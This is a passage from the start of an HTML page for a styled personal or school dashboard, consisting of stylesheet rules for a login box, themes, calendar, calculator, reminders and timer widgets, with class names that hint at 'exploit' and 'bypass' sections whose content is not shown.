<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System - Enhanced Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
  <style>
    /* Base Styles - Reset and Font Imports */
    * {
      box-sizing: border-box;
      font-family: 'Montserrat', sans-serif;
      transition: background-color 0.3s ease-in-out, color 0.3s ease-in-out, border-color 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
    }

    /* Scrollbar Styling */
    ::-webkit-scrollbar {
      width: 10px;
    }

    ::-webkit-scrollbar-track {
      background: #2a2a2a; /* Dark theme scrollbar track */
      border-radius: 5px;
    }

    body.dashboard-body.light-theme ::-webkit-scrollbar-track {
      background: #e0e0e0; /* Light theme scrollbar track */
    }

    ::-webkit-scrollbar-thumb {
      background: #ff914d; /* Dark theme scrollbar thumb */
      border-radius: 5px;
    }

    body.dashboard-body.light-theme ::-webkit-scrollbar-thumb {
      background: #994d00; /* Light theme scrollbar thumb */
    }
    
    body {
      margin: 0;
      padding: 0;
      line-height: 1.6;
      font-size: 16px;
    }

    /* Login System Styles */
    body.login-body {
      background: linear-gradient(135deg, #0f0f0f, #1a1a1a); /* Dark gradient background */
      color: #e0e0e0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden; /* Prevent scroll on login */
    }
    
    .login-box {
      background: #1c1c1c;
      border-radius: 20px;
      border: 3px solid #66bb6a; /* Initial success-like border */
      box-shadow: 0 0 25px rgba(102, 187, 106, 0.5); /* Initial success-like shadow */
      width: 380px; /* Slightly wider */
      padding: 35px 30px; /* More padding */
      text-align: center;
      position: relative;
      overflow: hidden; /* For inner animations */
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: #ff4c4c; box-shadow: 0 0 25px rgba(255, 76, 76, 0.7); } /* More intense red */
      50% { border-color: #e0e0e0; box-shadow: 0 0 10px rgba(224, 224, 224, 0.5); }
    }
    
    .login-box h2 {
      font-family: 'Roboto Mono', monospace; /* Monospaced font for system feel */
      font-size: 2em; /* Larger heading */
      margin-bottom: 25px;
      color: #ff914d; /* Accent color */
      text-shadow: 0 0 8px rgba(255, 145, 77, 0.5); /* Glowing text */
    }
    
    .login-box input {
      width: 100%;
      padding: 14px; /* More padding */
      margin-bottom: 18px; /* More margin */
      background: #2b2b2b; /* Darker input background */
      border: 1px solid #555; /* Subtle border */
      color: white;
      border-radius: 10px; /* More rounded */
      font-size: 1.05em; /* Slightly larger font */
      caret-color: #ff914d; /* Cursor color */
    }

    .login-box input:focus {
      border-color: #ff914d;
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.4);
      outline: none;
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.95em;
      margin-bottom: 15px;
      gap: 10px;
      cursor: pointer;
      color: #bbb;
    }

    .login-box label input[type="checkbox"] {
      width: auto;
      margin-bottom: 0;
      margin-right: 5px; /* Adjust spacing */
      accent-color: #ff914d; /* Checkbox color */
    }
    
    #showPassword:checked + span {
      color: #ff4c4c; /* Red for checked */
      font-weight: bold;
    }
    
    .login-box button {
      width: 100%;
      padding: 15px; /* More padding */
      background-color: #ff914d;
      color: #1a1a1a; /* Dark text on orange */
      font-size: 1.1em; /* Larger font */
      font-weight: bold;
      border: none;
      border-radius: 10px; /* More rounded */
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(255, 145, 77, 0.4);
      transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
    }
    
    .login-box button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(255, 182, 122, 0.6);
    }

    .login-box button:active {
      transform: translateY(0);
      box-shadow: 0 2px 10px rgba(255, 145, 77, 0.3);
    }
    
    .attempt-counter, .error-message {
      margin-top: 15px;
      font-size: 0.9em;
      color: #ff4c4c;
      font-weight: bold;
      animation: fadeIn 0.5s ease-out; /* Fade in error/attempts */
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-5px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 350px; /* Slightly larger popup */
      padding: 25px;
      transform: translate(-50%, -50%);
      background: #1c1c1c;
      border: 3px solid #ff4c4c; /* Red border for urgency */
      border-radius: 18px;
      box-shadow: 0 0 25px rgba(255, 76, 76, 0.7);
      z-index: 100; /* Higher z-index */
      animation: popupScaleIn 0.3s ease-out; /* Scale in animation */
    }

    @keyframes popupScaleIn {
      from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
      to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
    }
    
    .popup input {
      margin-bottom: 20px; /* More spacing */
      border-color: #ff4c4c; /* Red border for input */
    }
    .popup p {
      color: #ff4c4c;
      font-weight: bold;
      margin-bottom: 15px;
    }

    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s ease-in-out, color 0.3s ease-in-out;
      zoom: 1; /* Keep zoom for now */
      min-height: 100vh;
    }

    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }

    /* Theme-specific accent colors */
    :root {
      --accent-color: #ff914d;
      --accent-color-light: #ffb67a;
      --text-color: #f9f2dc;
      --background-color: #1a1a1a;
      --box-background: #2a2a2a;
      --box-shadow-color: rgba(255, 145, 77, 0.3);
      --input-background: #1c1c1c;
      --error-color: #ff4c4c;
      --success-color: #66bb6a;
    }

    body.dashboard-body.light-theme {
      --accent-color: #994d00;
      --accent-color-light: #cc6600;
      --text-color: #1a1a1a;
      --background-color: #f9f2dc;
      --box-background: #ffd966;
      --box-shadow-color: rgba(255, 145, 77, 0.6);
      --input-background: #fff3cc;
      --error-color: #cc0000;
      --success-color: #338833;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--accent-color);
      padding: 20px 30px; /* Increased padding */
      border-radius: 15px; /* More rounded */
      color: #000;
      margin-bottom: 25px; /* Increased margin */
      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
      animation: headerSlideIn 0.5s ease-out;
    }

    @keyframes headerSlideIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .dashboard-header h1 {
      font-size: 28px; /* Larger heading */
      margin: 0;
      text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
    }

    .user-info {
      font-weight: bold;
      font-size: 15px;
    }

    .version-box {
      background: var(--box-background);
      padding: 10px 18px; /* Increased padding */
      border-radius: 10px; /* More rounded */
      color: var(--text-color);
      font-weight: bold;
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
      border: 1px solid var(--accent-color-light); /* Added subtle border */
    }

    /* Quick Bar and Main Control Buttons */
    .quick-bar, .main-control-buttons {
      display: flex;
      justify-content: center;
      gap: 15px; /* Increased gap */
      margin-bottom: 20px; /* Increased margin */
      flex-wrap: wrap;
      animation: buttonsFadeIn 0.6s ease-out forwards;
      opacity: 0; /* Start hidden for animation */
      animation-delay: 0.2s; /* Delay for effect */
    }

    @keyframes buttonsFadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .quick-bar button, .main-control-buttons button {
      background-color: var(--accent-color);
      border: none;
      padding: 12px 18px; /* More padding */
      border-radius: 10px; /* More rounded */
      color: black; /* Consistent text color */
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
      min-width: 120px; /* Slightly wider buttons */
      white-space: nowrap;
      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
    }

    .quick-bar button:hover, .main-control-buttons button:hover {
      background-color: var(--accent-color-light);
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .quick-bar button:active, .main-control-buttons button:active {
      transform: translateY(0);
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }

    #panicBtn {
      background: var(--error-color) !important;
      color: white !important;
      box-shadow: 0 3px 10px rgba(255, 76, 76, 0.4) !important;
    }
    #panicBtn:hover {
      background: #ff6666 !important;
      box-shadow: 0 5px 15px rgba(255, 102, 102, 0.6) !important;
    }

    #themeToggle.light-theme-active {
      background-color: #ffe082; /* Lighter yellow for light theme toggle */
      color: #333;
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--accent-color);
      color: black;
      font-weight: bold;
      padding: 12px 0; /* More padding */
      overflow: hidden;
      position: relative;
      border-radius: 10px; /* More rounded */
      box-sizing: border-box;
      margin-bottom: 25px; /* Increased margin */
      user-select: none;
      height: 40px; /* Taller bar */
      line-height: 16px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
      animation: fadeIn 0.7s ease-out forwards;
      opacity: 0;
      animation-delay: 0.4s;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 25s linear infinite; /* Slower, longer scroll */
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-100%); }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: var(--box-background);
      color: var(--text-color);
    }

    .main-row {
      display: flex;
      gap: 25px; /* Increased gap */
      margin-bottom: 25px;
      flex-wrap: wrap;
    }

    .box {
      background-color: var(--box-background);
      padding: 25px; /* More padding */
      border-radius: 15px; /* More rounded */
      box-shadow: 0 0 18px var(--box-shadow-color);
      min-height: 150px; /* Taller boxes */
      flex: 1 1 320px; /* Adjusted flex basis */
      animation: boxFadeIn 0.8s ease-out forwards;
      opacity: 0;
      transform: translateY(10px);
    }

    @keyframes boxFadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .box:nth-child(2) { animation-delay: 0.1s; } /* Staggered animation */
    .box:nth-child(3) { animation-delay: 0.2s; }
    .box:nth-child(4) { animation-delay: 0.3s; }


    .box h2 {
      font-size: 20px; /* Larger heading */
      margin-bottom: 15px;
      color: var(--accent-color);
      border-bottom: 2px solid var(--accent-color-light); /* Subtle underline */
      padding-bottom: 8px;
    }

    .box p, .box ul {
      font-size: 15px;
      color: var(--text-color);
    }

    .update-entry {
      background: var(--input-background);
      padding: 10px;
      margin-top: 8px;
      border-radius: 8px;
      color: var(--text-color);
      border-left: 4px solid var(--accent-color); /* Highlight new updates */
      animation: entrySlideIn 0.4s ease-out forwards;
      opacity: 0;
      transform: translateX(-10px);
    }
    .update-entry:nth-child(2) { animation-delay: 0.1s; }
    .update-entry:nth-child(3) { animation-delay: 0.2s; }
    .update-entry:nth-child(4) { animation-delay: 0.3s; } /* For more entries */

    @keyframes entrySlideIn {
      from { opacity: 0; transform: translateX(-10px); }
      to { opacity: 1; transform: translateX(0); }
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 7px; /* Increased gap */
      margin-top: 15px;
      text-align: center;
      font-size: 13px;
    }

    .calendar div {
      padding: 8px; /* More padding */
      background: #333;
      border-radius: 6px; /* More rounded */
      color: var(--text-color);
      transition: background-color 0.2s ease;
    }

    body.dashboard-body.light-theme .calendar div {
      background: #e0e0e0;
      color: #1a1a1a;
    }

    .calendar div:hover:not(.today):not(:first-child):not(:nth-child(2)):not(:nth-child(3)):not(:nth-child(4)):not(:nth-child(5)):not(:nth-child(6)):not(:nth-child(7)) {
      background: var(--accent-color-light);
      color: black;
      cursor: pointer;
    }

    .today {
      background: var(--accent-color) !important;
      font-weight: bold;
      color: black !important;
      box-shadow: 0 0 8px var(--accent-color);
      animation: pulseToday 1.5s infinite alternate;
    }

    @keyframes pulseToday {
      from { transform: scale(1); box-shadow: 0 0 8px var(--accent-color); }
      to { transform: scale(1.05); box-shadow: 0 0 15px var(--accent-color), 0 0 5px var(--accent-color-light); }
    }

    body.dashboard-body.light-theme .today {
      background: var(--accent-color) !important; /* Keep original accent for today */
      color: var(--text-color) !important;
    }

    #canvasContainer {
      display: none;
      margin-top: 30px;
      text-align: center;
      background-color: var(--box-background);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px var(--box-shadow-color);
      animation: panelFadeIn 0.5s ease-out;
    }

    #notesCanvas {
      border: 3px solid var(--accent-color);
      border-radius: 15px;
      background: var(--input-background); /* White canvas for drawing */
      cursor: crosshair;
      touch-action: none;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      background-image: linear-gradient(#333 1px, transparent 1px), linear-gradient(90deg, #333 1px, transparent 1px);
      background-size: 20px 20px;
    }
    body.dashboard-body.light-theme #notesCanvas {
      background: white;
      background-image: linear-gradient(#e0e0e0 1px, transparent 1px), linear-gradient(90deg, #e0e0e0 1px, transparent 1px);
    }


    #canvasControls {
      margin-top: 20px;
    }

    #canvasControls button {
      background-color: var(--accent-color);
      border: none;
      padding: 10px 20px;
      border-radius: 10px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
      margin: 0 8px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
    }

    #canvasControls button:hover {
      background-color: var(--accent-color-light);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .motivation-box {
      background-color: #333;
      color: #ffd966;
      padding: 25px;
      border-radius: 15px;
      font-style: italic;
      font-size: 17px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 150px;
      text-align: center;
      line-height: 1.5;
      position: relative;
      overflow: hidden;
    }

    .motivation-box::before {
      content: "‚Äú";
      position: absolute;
      top: 10px;
      left: 15px;
      font-size: 5em;
      color: rgba(255, 217, 102, 0.2);
      font-family: serif;
      pointer-events: none;
    }

    .motivation-box::after {
      content: "‚Äù";
      position: absolute;
      bottom: -10px;
      right: 15px;
      font-size: 5em;
      color: rgba(255, 217, 102, 0.2);
      font-family: serif;
      pointer-events: none;
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.8);
    }
    body.dashboard-body.light-theme .motivation-box::before,
    body.dashboard-body.light-theme .motivation-box::after {
      color: rgba(153, 77, 0, 0.2);
    }


    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--box-background);
      padding: 30px; /* Increased padding */
      border-radius: 15px; /* More rounded */
      margin-top: 30px;
      box-shadow: 0 0 20px var(--box-shadow-color);
      animation: panelFadeIn 0.5s ease-out;
    }

    @keyframes panelFadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    body.dashboard-body.light-theme .info-panel {
      background-color: var(--box-background);
      color: var(--text-color);
    }

    .info-panel h2 {
      color: var(--accent-color);
      margin-bottom: 20px;
      font-size: 22px;
      border-bottom: 2px solid var(--accent-color-light);
      padding-bottom: 10px;
    }

    .info-panel h3 {
      color: var(--accent-color);
      margin-top: 25px;
      margin-bottom: 15px;
      font-size: 18px;
    }

    .info-panel p {
      margin-bottom: 10px;
      color: var(--text-color);
    }

    .wifi-grid, .wifi-entry, .school-info-grid, .list-grid-4, .list-grid-3, .list-grid-2 {
      display: grid;
      gap: 12px;
      margin-bottom: 15px;
      margin-top: 15px; /* Added margin-top */
    }

    .wifi-grid { grid-template-columns: repeat(8, 1fr); }
    .wifi-entry { grid-template-columns: repeat(8, 1fr); }
    .school-info-grid { grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); }
    .list-grid-4 { grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); }
    .list-grid-3 { grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); }
    .list-grid-2 { grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }


    .wifi-grid div, .wifi-entry div, .school-info-item,
    .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button,
    .ipad-options button, .reminder-item, .task-item, .schedule-item, .grade-entry,
    .resource-item, .club-item, .event-item, .attendance-entry, .discipline-entry,
    .maintenance-item, .it-support-item, .theme-option button, .news-item,
    .counseling-item, .course-item, .unit-converter-output, .pomodoro-timer-display {
      padding: 12px;
      background: var(--input-background);
      border-radius: 8px;
      text-align: center;
      font-weight: bold;
      color: var(--text-color);
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
      border: 1px solid rgba(255, 255, 255, 0.05); /* Subtle border for contrast */
    }
    
    .wifi-entry div, .school-info-item, .update-entry {
      font-weight: normal; /* Data entries can be normal weight */
    }

    .links-list a, .exploit-buttons a, .handbook-buttons a,
    .main-control-buttons button, .quick-bar button, .ipad-options button,
    .bypass-buttons button, .theme-option button {
      display: block;
      background-color: var(--accent-color);
      color: black;
      font-weight: bold;
      cursor: pointer;
      text-decoration: none;
      transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
    }
    .links-list a:hover, .exploit-buttons a:hover, .handbook-buttons a:hover,
    .main-control-buttons button:hover, .quick-bar button:hover, .ipad-options button:hover,
    .bypass-buttons button:hover, .theme-option button:hover {
      background-color: var(--accent-color-light);
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .coming-soon {
      background: var(--input-background);
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
      text-align: center;
      font-weight: bold;
      color: var(--accent-color-light);
      border: 2px dashed var(--accent-color);
      animation: pulseBorder 2s infinite alternate;
    }

    @keyframes pulseBorder {
      from { border-color: var(--accent-color); box-shadow: 0 0 10px rgba(255, 145, 77, 0.4); }
      to { border-color: var(--accent-color-light); box-shadow: 0 0 15px rgba(255, 182, 122, 0.6); }
    }


    .info-text {
      background: var(--input-background);
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
      white-space: pre-wrap; /* Preserve formatting for shortcuts */
      text-align: left;
    }

    .school-info-label {
      font-weight: bold;
      color: var(--accent-color);
      margin-bottom: 5px;
      display: block; /* Ensure label is on its own line */
    }

    .ipad-options, .bypass-buttons, .theme-options-grid {
      display: flex;
      gap: 10px;
      margin-top: 15px;
      flex-wrap: wrap; /* Allow wrapping */
    }

    .ipad-options button, .bypass-buttons button, .theme-option button {
      flex: 1;
      min-width: 150px; /* Ensure buttons don't get too small */
    }

    .ipad-content, .bypass-content, .reminder-list, .task-list,
    .schedule-content, .grades-content, .assignments-content,
    .study-resources-content, .course-catalog-content, .club-activity-content,
    .sports-content, .school-events-content, .news-content,
    .counseling-content, .attendance-content, .discipline-content,
    .maintenance-content, .it-support-content, .profile-settings-content,
    .dashboard-customization-content, .calculator-content, .unit-converter-content,
    .pomodoro-content, .virtual-assistant-content, .reminder-form {
      display: none;
      background: var(--input-background);
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
      border-left: 5px solid var(--accent-color-light);
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
    }
    .active-content {
      display: block;
      animation: contentFadeIn 0.4s ease-out;
    }
    @keyframes contentFadeIn {
      from { opacity: 0; transform: scale(0.98); }
      to { opacity: 1; transform: scale(1); }
    }

    /* Reminder System specific styles */
    #reminderPanel {
      display: none; /* Controlled by JS */
    }
    .reminder-form {
      margin-bottom: 20px;
      display: block; /* Always visible when panel is active */
    }
    .reminder-form label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      color: var(--accent-color);
      text-align: left;
    }
    .reminder-form input[type="text"],
    .reminder-form input[type="datetime-local"],
    .reminder-form select {
      width: calc(100% - 24px); /* Account for padding */
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #555;
      background-color: #333;
      color: var(--text-color);
      border-radius: 5px;
    }
    .reminder-form button {
      background-color: var(--success-color);
      color: white;
      padding: 10px 15px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    .reminder-form button:hover {
      background-color: #5cb85c;
    }

    .reminder-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 10px;
      padding: 15px;
      background: #333;
      border-left: 5px solid var(--accent-color);
      text-align: left;
    }

    body.dashboard-body.light-theme .reminder-item {
      background: #f0f0f0;
      border-left-color: var(--accent-color-light);
    }

    .reminder-item.completed {
      opacity: 0.6;
      text-decoration: line-through;
      border-left-color: var(--success-color);
    }
    .reminder-item.high-priority { border-left-color: var(--error-color); }
    .reminder-item.medium-priority { border-left-color: var(--accent-color); }
    .reminder-item.low-priority { border-left-color: #5bc0de; }


    .reminder-item button {
      background: none;
      border: none;
      color: var(--accent-color);
      cursor: pointer;
      font-size: 1.1em;
      margin-left: 10px;
      padding: 5px;
      transition: color 0.2s ease, transform 0.2s ease;
    }
    .reminder-item button:hover {
      color: var(--accent-color-light);
      transform: scale(1.1);
    }
    .reminder-item button.delete { color: var(--error-color); }
    .reminder-item button.delete:hover { color: #ff6666; }
    .reminder-item button.complete { color: var(--success-color); }
    .reminder-item button.complete:hover { color: #5cb85c; }

    .reminder-item-details {
      flex-grow: 1;
    }
    .reminder-item-details strong {
      display: block;
      font-size: 1.1em;
      margin-bottom: 5px;
    }
    .reminder-item-details small {
      font-size: 0.85em;
      color: #aaa;
    }

    /* Task Manager */
    .task-list {
      display: grid;
      gap: 10px;
    }
    .task-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-left: 5px solid #6c757d;
      text-align: left;
    }
    .task-item.completed {
      opacity: 0.7;
      text-decoration: line-through;
      border-left-color: var(--success-color);
    }
    .task-item-controls button {
      margin-left: 8px;
      padding: 6px 10px;
      border-radius: 5px;
      font-weight: normal;
      font-size: 0.9em;
    }
    .task-item-controls button.complete { background-color: var(--success-color); color: white; }
    .task-item-controls button.delete { background-color: var(--error-color); color: white; }

    /* Calculator */
    #calculatorDisplay {
      background: #000;
      color: #0f0; /* Green LED style */
      font-family: 'Roboto Mono', monospace;
      font-size: 2.5em;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 15px;
      text-align: right;
      overflow-x: auto;
      white-space: nowrap;
      border: 1px solid #0f0;
    }
    .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
    }
    .calculator-grid button {
      padding: 15px;
      font-size: 1.2em;
      background-color: #444;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .calculator-grid button:hover { background-color: #666; }
    .calculator-grid button.operator { background-color: var(--accent-color); color: black; }
    .calculator-grid button.operator:hover { background-color: var(--accent-color-light); }
    .calculator-grid button.clear { background-color: var(--error-color); }
    .calculator-grid button.clear:hover { background-color: #ff6666; }
    .calculator-grid button.equals { background-color: var(--success-color); }
    .calculator-grid button.equals:hover { background-color: #5cb85c; }

    /* Unit Converter */
    .unit-converter-controls {
      display: flex;
      gap: 10px;
      margin-bottom: 15px;
      flex-wrap: wrap;
    }
    .unit-converter-controls select, .unit-converter-controls input {
      flex: 1;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: var(--text-color);
      min-width: 120px;
    }
    .unit-converter-output {
      font-size: 1.2em;
      color: var(--success-color);
      text-align: left;
      border-left: 5px solid var(--success-color);
    }

    /* Pomodoro Timer */
    .pomodoro-timer-display {
      font-family: 'Roboto Mono', monospace;
      font-size: 3em;
      padding: 20px;
      margin-bottom: 20px;
      background: #000;
      color: var(--success-color);
      border: 2px solid var(--success-color);
      box-shadow: 0 0 15px rgba(102, 187, 106, 0.5);
    }
    .pomodoro-controls button {
      padding: 10px 20px;
      margin: 0 5px;
      border-radius: 8px;
      font-weight: bold;
      background-color: var(--accent-color);
      color: black;
      border: none;
      cursor: pointer;
    }
    .pomodoro-controls button.start { background-color: var(--success-color); color: white; }
    .pomodoro-controls button.reset { background-color: var(--error-color); color: white; }

    /* Virtual Assistant */
    #virtualAssistantOutput {
      min-height: 150px;
      background: #000;
      color: #0f0;
      font-family: 'Roboto Mono', monospace;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 15px;
      text-align: left;
      overflow-y: auto;
      border: 1px solid #0f0;
      white-space: pre-wrap;
    }
    #virtualAssistantInput {
      width: calc(100% - 24px);
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #0f0;
      background-color: #000;
      color: #0f0;
      font-family: 'Roboto Mono', monospace;
      font-size: 1em;
    }

    /* Settings Panel */
    #profileSettingsContent label, #dashboardCustomizationContent label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: var(--accent-color);
    }
    #profileSettingsContent input, #dashboardCustomizationContent input, #dashboardCustomizationContent select {
      width: calc(100% - 24px);
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #555;
      background-color: #333;
      color: var(--text-color);
      border-radius: 5px;
    }
    #profileSettingsContent button, #dashboardCustomizationContent button {
      background-color: var(--accent-color);
      color: black;
      padding: 10px 15px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s;
      margin-top: 10px;
    }
    #profileSettingsContent button:hover, #dashboardCustomizationContent button:hover {
      background-color: var(--accent-color-light);
    }

    .theme-options-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
      gap: 10px;
      margin-top: 20px;
    }
    .theme-option button {
      padding: 15px;
      border: 2px solid transparent;
    }
    .theme-option.active button {
      border-color: var(--success-color);
      box-shadow: 0 0 10px var(--success-color);
    }
    #defaultThemeBtn { background-color: #1a1a1a; color: #f9f2dc; }
    #defaultThemeBtn:hover { background-color: #333; }
    #lightThemeBtn { background-color: #f9f2dc; color: #1a1a1a; }
    #lightThemeBtn:hover { background-color: #eee; }
    #blueThemeBtn { background-color: #2196F3; color: white; }
    #blueThemeBtn:hover { background-color: #42a5f5; }
    #greenThemeBtn { background-color: #4CAF50; color: white; }
    #greenThemeBtn:hover { background-color: #66bb6a; }


    /* Responsive Design Adjustments */
    @media (max-width: 1200px) {
      .main-row {
        flex-direction: column;
      }
      .box {
        flex: 1 1 100%;
      }
      .dashboard-header {
        flex-direction: column;
        text-align: center;
        padding: 20px;
      }
      .dashboard-header .user-info, .dashboard-header .version-box {
        margin-top: 10px;
      }
    }

    @media (max-width: 768px) {
      .login-box {
        width: 90%;
        padding: 25px 20px;
      }
      .dashboard-header h1 {
        font-size: 22px;
      }
      .quick-bar button, .main-control-buttons button {
        min-width: unset;
        width: 100%;
      }
      .quick-bar, .main-control-buttons {
        flex-direction: column;
      }
      .wifi-grid, .wifi-entry {
        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); /* More flexible */
      }
      .list-grid-4, .list-grid-3, .list-grid-2, .theme-options-grid {
        grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      }
      #notesCanvas {
        width: 100%;
        height: auto;
      }
    }

    @media (max-width: 480px) {
      body.dashboard-body {
        padding: 10px;
      }
      .dashboard-header {
        padding: 15px;
      }
      .dashboard-header h1 {
        font-size: 20px;
      }
      .announcement-bar {
        font-size: 13px;
        height: 35px;
        line-height: 14px;
      }
      .box h2, .info-panel h2 {
        font-size: 18px;
      }
      .box p, .box ul, .info-panel p {
        font-size: 13px;
      }
      .motivation-box {
        font-size: 14px;
      }
      .calendar div {
        font-size: 11px;
        padding: 5px;
      }
      #calculatorDisplay {
        font-size: 1.8em;
      }
      .calculator-grid button {
        padding: 10px;
        font-size: 1em;
      }
      .pomodoro-timer-display {
        font-size: 2em;
      }
    }

    /* New Category Sections Styling */
    .dashboard-category-section {
      margin-top: 40px;
      padding-top: 20px;
      border-top: 2px solid var(--accent-color);
      animation: sectionSlideUp 0.7s ease-out forwards;
      opacity: 0;
      transform: translateY(20px);
    }
    .dashboard-category-section:nth-of-type(1) { animation-delay: 0.5s; } /* Staggered */
    .dashboard-category-section:nth-of-type(2) { animation-delay: 0.6s; }
    .dashboard-category-section:nth-of-type(3) { animation-delay: 0.7s; }
    .dashboard-category-section:nth-of-type(4) { animation-delay: 0.8s; }
    .dashboard-category-section:nth-of-type(5) { animation-delay: 0.9s; }
    .dashboard-category-section:nth-of-type(6) { animation-delay: 1.0s; }


    @keyframes sectionSlideUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .dashboard-category-section h2 {
      text-align: center;
      font-size: 26px;
      color: var(--accent-color);
      margin-bottom: 30px;
      text-shadow: 0 0 5px rgba(255, 145, 77, 0.3);
    }

    .dashboard-category-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Flexible grid for buttons */
      gap: 15px;
      margin-bottom: 30px;
    }

    .dashboard-category-buttons button {
      background-color: var(--accent-color);
      border: none;
      padding: 15px 20px;
      border-radius: 12px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
      font-size: 1.1em;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .dashboard-category-buttons button:hover {
      background-color: var(--accent-color-light);
      transform: translateY(-4px);
      box-shadow: 0 6px 18px rgba(0,0,0,0.3);
    }

    .notification-alert {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #ff914d;
      color: black;
      padding: 15px 25px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      z-index: 1000;
      animation: slideInRight 0.5s ease-out, fadeOut 0.5s ease-in 4.5s forwards;
      opacity: 0;
      transform: translateX(100%);
      display: flex;
      align-items: center;
      gap: 10px;
    }

